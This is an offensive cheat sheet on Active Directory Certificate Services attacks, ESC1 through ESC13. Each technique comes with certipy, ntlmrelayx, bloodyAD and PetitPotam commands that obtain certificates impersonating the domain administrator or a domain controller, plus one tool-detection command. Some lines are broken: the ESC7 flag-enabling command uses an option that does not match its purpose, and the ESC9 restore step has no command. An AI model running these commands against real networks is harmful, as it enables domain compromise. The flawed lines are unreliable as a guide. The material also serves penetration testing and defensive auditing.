# ADCS Attacks (ESC1–ESC9, ESC11, ESC13)

**MITRE:** T1649

Active Directory Certificate Services misconfigurations allow obtaining certificates that authenticate as any domain user, including Domain Admins.

## ESC1 — Enrollee supplies Subject Alternative Name

The template allows the enrollee to specify the SAN. Combined with an authentication EKU, any enrollee can request a certificate for `administrator@corp.local`.

```bash
certipy req -u jdoe@corp.local -p 'Pass' -ca 'CORP-CA' \
  -template 'VulnTemplate' -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

## ESC2 — Any Purpose EKU

Template has `Any Purpose` or no EKU restrictions — can be used for any authentication purpose.

## ESC3 — Enrollment Agent

Template has `Certificate Request Agent` EKU. Attacker obtains an agent certificate, then requests a certificate on behalf of any user.

```bash
# Step 1: get agent cert
certipy req -u jdoe@corp.local -p 'Pass' -ca 'CORP-CA' -template 'AgentTemplate'

# Step 2: request cert on behalf of admin
certipy req -u jdoe@corp.local -p 'Pass' -ca 'CORP-CA' \
  -template 'User' -on-behalf-of 'corp\administrator' \
  -pfx agent.pfx
```

## ESC4 — Template write access

Low-privilege principal has `WriteDACL`, `WriteOwner`, `GenericAll`, or `GenericWrite` on the template object. Attacker modifies the template to introduce ESC1.

```bash
certipy template -u jdoe@corp.local -p 'Pass' \
  -template 'VulnTemplate' -save-old

# Modify to add ENROLLEE_SUPPLIES_SUBJECT
certipy template -u jdoe@corp.local -p 'Pass' \
  -template 'VulnTemplate' -value msPKI-Certificate-Name-Flag=1
```

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

The CA has this flag set — any template allows SAN regardless of template configuration.

```bash
certipy req -u jdoe@corp.local -p 'Pass' -ca 'CORP-CA' \
  -template 'User' -upn administrator@corp.local
```

## ESC7 — ManageCA / ManageCertificates

Low-privilege has officer rights on the CA object. ManageCA allows enabling ESC6. ManageCertificates allows approving pending requests.

```bash
# Enable EDITF flag (ManageCA)
certipy ca -u jdoe@corp.local -p 'Pass' -ca 'CORP-CA' \
  -enable-telemetry

# Issue a pending request (ManageCertificates)
certipy ca -u jdoe@corp.local -p 'Pass' -ca 'CORP-CA' \
  -issue-request 42
```

## ESC8 — Web Enrollment

AD CS has NTLM-authenticating HTTP endpoint. Can be abused via NTLM relay to obtain a DC certificate.

```bash
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp \
  --adcs --template 'DomainController'
```

## ESC9 — No Security Extension

The template has `CT_FLAG_NO_SECURITY_EXTENSION` (0x00080000) in `msPKI-Enrollment-Flag`. Issued certificates do **not** include the `szOID_NTDS_CA_SECURITY_EXT` extension, which normally binds the certificate to an AD SID.

Without SID binding, if the enrollee's `userPrincipalName` is changed to match another account's UPN before requesting the cert, the cert maps to the other account.

**Requires:** GenericWrite (or equivalent) over a victim account.

```bash
# 1. Change victim's UPN to impersonate target
bloodyAD -u jdoe -p 'Pass' -d corp.local \
  set object victim userPrincipalName administrator@corp.local

# 2. Request cert as victim
certipy req -u victim@corp.local -p 'victimpass' -ca 'CORP-CA' -template 'VulnTemplate'

# 3. Restore victim's UPN, then authenticate
certipy auth -pfx administrator.pfx -domain corp.local -dc-ip 10.0.0.1
```

## ESC11 — ICPR/DCOM Relay

The legacy MS-ICPR (RPC-based Certificate Enrollment) interface can be relayed similar to ESC8, but over DCOM instead of HTTP. No remote check is possible — manual verification required.

```bash
certipy relay -target 'rpc://ca.corp.local' -template 'DomainController'
# Trigger coercion: python3 PetitPotam.py <attacker-ip> ca.corp.local
```

## ESC13 — Issuance Policy OID Linked to Group

A certificate template references an issuance policy OID (via `msPKI-Certificate-Policy`) that has `msDS-OIDToGroupLink` pointing to a privileged AD group. When a user authenticates with such a certificate, they receive the group's privileges in their Kerberos PAC.

```bash
# Enroll in the policy-linked template
certipy req -u jdoe@corp.local -p 'Pass' -ca 'CORP-CA' -template 'PolicyTemplate'

# Authenticate — group membership is applied via OID in the cert
certipy auth -pfx jdoe.pfx -domain corp.local -dc-ip 10.0.0.1
```

## Detection with adpath

```bash
adpath adcs -d corp.local -u jdoe -p 'Password1' --dc 10.0.0.1
```
